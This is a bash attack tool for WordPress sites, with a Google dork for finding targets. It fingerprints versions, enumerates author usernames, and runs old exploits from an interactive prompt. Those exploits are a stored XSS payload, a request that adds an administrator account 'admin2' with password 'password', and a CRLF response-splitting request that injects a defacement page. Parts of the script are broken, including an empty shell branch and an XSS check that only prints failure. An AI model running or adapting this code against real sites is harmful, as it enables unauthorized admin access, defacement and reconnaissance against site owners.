#!/bin/bash
# WordPress Exploit
# Google Dork: https://www.google.com/search?q="index of" inurl:wp-content/
# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)
# Updates: https://github.com/Shadowz3n/WPExploit
# Reference Link: https://wpvulndb.com/wordpresses
# Reference Exploits: http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html

RED=`tput setaf 1`
GREEN=`tput setaf 2`
NC=`tput sgr0`
HEADERS="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0"

set -i

tput clear
exiting(){
	tput clear
	rm -f /tmp/tempfile
	echo "${GREEN}Exiting..${NC}"
	exit 1
}
trap exiting SIGINT # Ctrl+C

helptxt(){
	echo -e "\n\t${GREEN}Type 'exit' to finish${NC}"
	echo -e "\t${GREEN}Type 'exploit' to test all available exploits${NC}\n"
}
if [[ "$1" ]]; then
	url="${1##*\/\/}"
	url="${url%%\/*}"
	echo -e "\n\n";
	echo -e "\t${GREEN}URL: $1 ${NC}"
	if ping -c 1 $url &> /dev/null; then
		
		# WordPress Version
		wpcurl=`curl -s -H $HEADERS $1`
		iswp=`echo $wpcurl | grep 'wp-content'`
		
		# If not WordPress
		if [[ $iswp = '' ]]; then
			echo -e "\t${RED}[The remote website is up, but does not seem to be running WordPress]\n${NC}"
			exit 1
		fi
		
		wp_version=`echo $wpcurl | grep 'generator' | grep 'WordPress'`
		if [[ "$wp_version" != '' ]]; then
			WPV="${wp_version##*WordPress }"
			WPVS=${WPV:0:5}
			WPV=`echo $WPV | sed -r 's/[.]+//g'`
			WPV=${WPV:0:3}
			echo -e "\t${GREEN}WordPress Version: $WPVS${NC}\n"
		else
			WPV='0'
			echo -e "\t${RED}[Undefined WordPress Version]${NC}\n"
		fi
		
		# Enumerate Author Users
		read -p "${GREEN}Enumerate users? [Y/n] ${NC}" enum; echo
		enum=`echo $enum | tr '[:upper:]' '[:lower:]'`
		if [[ $enum = 'y' || $enum = '' ]]; then
			echo -e "\t${GREEN}Enumerating usernames.. [1-5]${NC}"
			USERS=`for i in {1..5}; do curl -H $HEADERS -s -L -i $1/?author=$i | grep -E -o "\" title=\"View all posts by [a-z0-9A-Z\-\.]*|Location:.*" | sed 's/\// /g' | cut -f 6 -d ' ' | grep -v "^$"; done`
			if [[ "$USERS" != '' ]]; then
				echo -e "\t\t${GREEN}$USERS${NC}\n" | sed -r 's/[\n]+/\n\t/g'
			else
				echo -e "\t\t${RED}[It was not possible to enumerate users]${NC}\n"
			fi
		fi
		
		_422(){
			
			# WordPress <= 4.2 Stored XSS
			echo -e "\t${GREEN}WordPress <= 4.2 Stored XSS${NC}"
			#<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
			echo -e "\t${RED}[Fail]${NC}\n"
			
		}
		
		_332(){
		
			# WordPress <= 3.3.1
			echo -e "\t${GREEN}WordPress <= 3.3.1 Adding new admin..${NC}"
			add_admin=`curl -H $HEADERS -s -o "/dev/null" -w "%{http_code}" "$1/wp-admin/user-new.php" -d "action=createuser&_wpnonce_create-user=<sniffed_value>&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=admin2&email=admin2@admin.com&first_name=admin2@admin.com&last_name=&url=&pass1=password&pass2=password&role=administrator&createuser=Add+New+User+"`
			if [[ "$add_admin" = '200' ]]; then
				echo -e "\t${GREEN}Link: $1/wp-admin \n\tLogin: admin2 \n\tPass: password${NC}\n"
			else
				echo -e "\t${RED}[Fail]${NC}\n"
			fi
		}
		
		_122(){
			
			# WordPress <= 1.2
			echo -e "\t${GREEN}Wordpress <= 1.2 Trying to login..${NC}"
			login=`curl -H $HEADERS -s -o "/dev/null" -w "%{http_code}" "$1/?action=login&mode=profile&log=USER&pwd=PASS&text=%0d%0aConnection: Keep-Alive%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.0 200 OK%0d%0aContent-Length: 21%0d%0aContent-Type: text/html%0d%0a%0d%0a{html}*defaced*{/html} "`
			if [[ "$login" = '200' ]]; then
				echo -e "${GREEN}\tVuln${NC}\n"
			else
				echo -e "\t${RED}[Fail]${NC}\n"
			fi
		}
		declare -a WPExploitArray=(_422 _332 _122)
		
		# Shell
		helptxt
		while true; do
			read -p "${GREEN}WPExploit> ${NC}" shell
			shell=`echo $shell | tr '[:upper:]' '[:lower:]'`
			if [[ $shell = 'exit' ]]; then
				exiting
			elif [[ $shell = 'help' ]]; then
				tput clear
				helptxt
			elif [[ $shell = 'enumerate' ]]; then
				
			elif [[ $shell = 'exploit' ]]; then
				tput clear
				echo -e "\n\n\t${GREEN}Testing all available exploits${NC}\n"
				for f in ${WPExploitArray[@]}; do
					if [[ $WPV < ${f:1:3} ]]; then
						$f $1
					fi
				done
			else
				tput clear
				helptxt
			fi
		done
		
		echo -e "\t${GREEN}WordPress Scan Done${NC}"
	else
		echo -e "\t${RED}[$url is down]${NC}"
	fi
else
	echo -e "Usage: bash $0 site.com"
fi
